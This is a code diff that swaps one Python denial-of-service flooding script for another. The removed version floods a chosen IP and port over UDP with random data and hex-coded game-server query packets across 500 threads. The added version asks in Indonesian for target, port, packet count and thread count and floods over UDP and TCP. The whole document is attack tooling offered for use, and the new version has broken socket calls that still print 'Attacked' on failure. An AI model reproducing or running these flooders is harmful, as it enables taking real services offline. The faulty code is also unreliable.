@@ -1,56 +1,49 @@
-import socket, struct, codecs, sys, threading, random, time, os
-ip = sys.argv[1]
-port = sys.argv[2]
-orgip = ip
-Pacotes = [
- codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
- codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
- codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
- codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
- codecs.decode('081e62da', 'hex_codec'),
- codecs.decode('081e77da', 'hex_codec'),
- codecs.decode('081e4dda', 'hex_codec'),
- codecs.decode('021efd40', 'hex_codec'),
- codecs.decode('081e7eda', 'hex_codec')]
+import random
+import socket
+import threading
+import time
+import sys,os
 
-os.system("clear")
-print ' \033[95m******************************************'
-print ' \033[95m=========== \033[94mDDOS TOOLS XR TEAMS \033[95m==========='               
-print ' ******************************************'
-print("\033[91mTOK TOK BARANG SAMPAI IP \033[92m%s \033[91mDAN MEMBERI ROTI KEPORT \033[92m%s!!"%(ip,port))
+print("""\033[91m
+█░█░█ █ ▀█ ▀█ █▀ █▀▀ █▀▀
+▀▄▀▄▀ █ █▄ █▄ ▄█ ██▄ █▄▄
+""")
 
-class MyThread(threading.Thread):
-
-    def run(self):
-        while True:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            bytes = random._urandom(20174)
-            pack = random._urandom(1800)
-            msg = Pacotes[random.randrange(0, 1)]
-            sock.sendto(bytes, (ip, int(port)))
-            sock.sendto(pack, (ip, int(port)))
-            sock.sendto(msg, (ip, int(port)))
-            if int(port) == 7777:
-                sock.sendto(Pacotes[5], (ip, int(port)))
-            elif int(port) == 7796:
-                sock.sendto(Pacotes[4], (ip, int(port)))
-            elif int(port) == 7771:
-                sock.sendto(Pacotes[6], (ip, int(port)))
-            elif int(port) == 7784:
-                sock.sendto(Pacotes[7], (ip, int(port)))
-
-
-if __name__ == '__main__':
+ip = str(input("IP DEK > "))
+port = int(input("PORT DEK > "))
+choice = str(input("(y) > "))
+times = int(input("PAKETS NYA DEK > "))
+threads = int(input("THREADS NYA DEK > "))
+os.system('clear')
+def run():
+  data = random._urandom(1800)
+  while True:
     try:
-        for x in range(500):
-            mythread = MyThread()
-            mythread.start()
-            time.sleep(.1)
+      s = socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(addr,data)
+        print(f"Attacked Ip Port {ip}:{port}")
+    except:
+      print(f"Attacked Ip Port {ip}:{port}")
 
-    except KeyboardInterrupt:
-        os.system('cls' if os.name == 'nt' else 'clear')
-        print '************************'
-        print '** DDOS TOOLS XR TEAMS **'
-        print '************************'
-        print '\n\n'
-        print ('BERHENTI MENYERANG {}').format(orgip)
+def run1():
+  data = random._urandom(1800)
+  while True:
+    try:
+      s = socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.connect((ip,port))
+      s.send(data)
+      for x in range(times):
+        s.send(data)
+        print(f"Attacked Ip Port {ip}:{port}")
+    except:
+      s.close()
+      print(f"Attacked Ip Port {ip}:{port}")
+
+for y in range(threads):
+  if choice == 'y':
+    th = threading.Thread(target=run)
+    th.start()
+    th = threading.Thread(target=run1)
+    th.start()
